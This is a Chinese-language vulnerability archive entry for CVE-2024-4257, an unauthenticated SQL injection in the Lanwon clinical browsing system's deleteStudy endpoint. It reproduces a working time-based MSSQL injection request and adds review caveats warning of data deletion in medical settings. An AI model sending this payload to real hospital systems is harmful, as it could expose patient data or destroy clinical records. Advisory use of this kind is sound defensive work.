---
source: "gelusus/wxvl 公众号漏洞文库"
title: "蓝网Lanwon临床浏览系统 deleteStudy documentUniqueId SQL 注入"
product: "蓝网Lanwon临床浏览系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2024-4257"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "1.2.1，MSSQL WAITFOR"
prerequisites: "未授权声称"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；延迟探测可能占用数据库连接或影响服务"
review_date: "2026-10-02"
identifier_role: "primary"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%93%9D%E7%BD%91%E7%A7%91%E6%8A%80/%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%20%20%E8%93%9D%E7%BD%91%E7%A7%91%E6%8A%80%E4%B8%B4%E5%BA%8A%E6%B5%8F%E8%A7%88%E7%B3%BB%E7%BB%9F%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-320c98c3c038e38ce379169d"
entity_id: "ve-320c98c3c038e38ce379169d"
schema_version: "1"
---

# 蓝网Lanwon临床浏览系统 deleteStudy documentUniqueId SQL 注入

## 条目说明

- 对象与具体问题：蓝网Lanwon临床浏览系统；deleteStudy documentUniqueId SQLi
- 版本、配置及部署条件：1.2.1，MSSQL WAITFOR
- 认证与权限前提：未授权声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- deleteStudy请求可能删除研究数据，医疗场景不能作为无副作用检测，需显著风险标记
- 只有延迟请求无基线/响应，CVE及官方已修复均需公告核实
- 厂商首页不等于安全修复公告，没有安全版本；Host是模板变量未说明环境

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

浅安  浅安安全   2024-05-13 07:00  
  
**0x00 漏洞编号**  
- # CVE-2024-4257  
  
**0x01 危险等级**  
- 高危  
  
**0x02 漏洞概述**  
  
蓝网科技临床浏览系统是一个专门用于医疗行业的软件系统，主要用于医生、护士和其他医疗专业人员在临床工作中进行信息浏览、查询和管理。  
  
![](../../.resource/remote/39b858bbc31e831c4e0e6cd4c9ca3e4e0c1d4baaac96d545fce79125adc3f867.png "")  
  
**0x03 漏洞详情**  
####   
####   
  
**CVE-2024-4257**  
  
**漏洞类型：**  
SQL注入  
  
  
**影响：**  
  
获取敏感信息  
  
**简述：**  
蓝网科技临床浏览系统存在SQL注入漏洞，未授权的攻击者可以利用该漏洞获取数据库敏感信息。  
####   
  
**0x04 影响版本**  
- 蓝网科技临床浏览系统 1.2.1  
  
**0x05****POC**  
```http
GET /xds/deleteStudy.php?documentUniqueId=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
**仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布****者**  
**不承担任何法律及连带责任。**  
  
**0x06****修复建议**  
  
**目前官方已发布漏洞修复版本，建议用户升级到安全版本****：**  
  
https://www.lanwon.com/  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
